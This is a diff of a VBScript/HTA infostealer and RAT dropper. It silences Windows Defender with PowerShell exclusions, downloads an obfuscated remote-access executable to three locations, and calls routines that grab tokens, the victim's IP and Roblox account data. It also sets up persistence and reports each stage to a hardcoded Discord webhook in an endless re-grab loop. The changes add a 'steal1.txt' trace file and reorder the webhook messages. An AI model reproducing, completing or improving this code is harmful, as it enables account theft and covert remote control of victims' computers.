@@ -16,20 +16,28 @@ RE_WH = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6ML
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. DISABLE DEFENDER (Silent, native PowerShell) ---
-Call DisableDefender
+' TRACE
+Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
+Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
-' --- 2. INSTANT RAT DOWNLOAD (3 SPOTS) ---
+' --- 1. SESSION START ---
+Call PostEmbed(":satellite: Session Start", "PC: " & PC & " | User: " & USER, 10181046)
+
+' --- 2. DEFENDER BYPASS & OBFUSCATED RAT DOWNLOAD ---
+Call DisableDefender
 Call DropRAT
 
-' --- 3. Initial Grabs ---
+' --- 3. GRABS ---
 Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
 Call PostFullRobloxUI
 
-' --- INFINITE Re-grab chain (every 2.5 minutes) ---
+' --- 4. RAT SUCCESS MESSAGE (LAST) ---
+Call PostEmbed(":package: RAT Download", "Payload deployed and executed.", 10181046)
+
+' --- 5. INFINITE Re-grab chain ---
 Dim runCount
 runCount = 0
 Do
@@ -47,12 +55,10 @@ window.close()
 
 ' --- DISABLE WINDOWS DEFENDER (Silent) ---
 Sub DisableDefender()
-    ' Use native PowerShell to disable real-time monitoring and add exclusion for the drop paths
     Dim psCmd, psf, f
     psCmd = "try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {};" & _
             "try { Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Templates' -ErrorAction SilentlyContinue } catch {};" & _
-            "try { Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue } catch {};" & _
-            "try { Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup' -ErrorAction SilentlyContinue } catch {}"
+            "try { Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue } catch {}"
     
     psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\def.cmd"
     Set f = fso.CreateTextFile(psf, True)
@@ -63,7 +69,7 @@ Sub DisableDefender()
     fso.DeleteFile psf, True
 End Sub
 
-' --- OBFUSCATED & FAST RAT DROP (3 LOCATIONS) ---
+' --- OBFUSCATED RAT DROP (3 LOCATIONS) ---
 Sub DropRAT()
     ' Obfuscated EXE URL
     Dim u1, u2, u3, exeUrl
@@ -95,9 +101,6 @@ Sub DropRAT()
             End If
         End If
     Next
-    
-    ' RAT message sent LAST (after all drops)
-    Call PostEmbed(":package: RAT Download", "Payload deployed from 3 locations.", 10181046)
 End Sub
 
 ' --- RunCmd (Hidden Execution via WMI) ---
